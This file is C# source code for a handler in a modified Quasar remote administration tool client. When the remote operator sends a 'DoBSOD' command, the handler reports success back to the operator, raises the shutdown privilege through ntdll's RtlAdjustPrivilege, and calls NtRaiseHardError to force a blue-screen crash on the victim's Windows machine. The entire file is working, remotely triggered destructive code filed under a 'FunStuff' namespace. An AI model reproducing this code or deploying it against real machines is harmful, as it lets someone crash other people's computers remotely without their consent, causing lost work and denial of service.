using Quasar.Common.Messages;
using Quasar.Common.Networking;
using System.Runtime.InteropServices;
using System;
using System.Windows.Forms;
using Quasar.Common.Messages.FunStuff;
using Quasar.Common.Messages.other;

namespace Quasar.Client.Messages
{

    public class BSODHandler : IMessageProcessor
    {
        [DllImport("ntdll.dll")]
        public static extern uint RtlAdjustPrivilege(int Privilege, bool bEnablePrivilege, bool IsThreadPrivilege, out bool PreviousValue);

        [DllImport("ntdll.dll")]
        public static extern uint NtRaiseHardError(uint ErrorStatus, uint NumberOfParameters, uint UnicodeStringParameterMask, IntPtr Parameters, uint ValidResponseOption, out uint Response);


        public bool CanExecute(IMessage message) => message is DoBSOD;

        public bool CanExecuteFrom(ISender sender) => true;

        public void Execute(ISender sender, IMessage message)
        {
            switch (message)
            {
                case DoBSOD msg:
                    Execute(sender, msg);
                    break;
            }
        }

        private void Execute(ISender client, DoBSOD message)
        {
            client.Send(new SetStatus { Message = "Successfull BSOD" });

            BSOD();
        }

        static unsafe void BSOD()
        {
            bool t1;
            RtlAdjustPrivilege(19, true, false, out t1);
            uint resp;
            NtRaiseHardError(0xc0000022, 0, 0, IntPtr.Zero, 6, out resp);
        }
    }
}
